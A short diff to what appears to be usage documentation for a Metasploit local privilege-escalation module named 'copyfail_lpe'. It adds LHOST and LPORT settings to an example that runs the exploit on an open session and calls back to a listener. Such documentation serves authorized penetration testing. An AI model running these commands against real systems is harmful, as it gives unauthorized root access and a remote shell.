@@ -58,6 +58,8 @@ msf6 > reload_all
 ```
 msf6 > use exploit/linux/local/copyfail/copyfail_lpe
 msf6 exploit(...) > set SESSION 1
+msf6 exploit(...) > set LHOST 10.10.10.10
+msf6 exploit(...) > set LPORT 4444
 msf6 exploit(...) > run
 ```
 
